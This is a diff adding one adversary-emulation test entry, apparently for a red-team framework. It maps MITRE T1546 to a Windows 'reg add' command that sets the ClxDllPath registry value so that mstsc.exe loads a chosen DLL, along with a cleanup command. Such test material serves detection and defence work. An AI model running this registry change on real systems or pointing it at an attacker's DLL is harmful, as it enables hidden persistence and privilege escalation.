@@ -1,0 +1,14 @@
+- id: 796b4448-1791-5e42-bba9-745ac267da3b
+  name: Soumaia ART Tests - Load custom DLL on mstsc execution
+  description: Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe (requires elevation)
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546
+    name: Event Triggered Execution
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
+        cleanup: |-
+          reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f
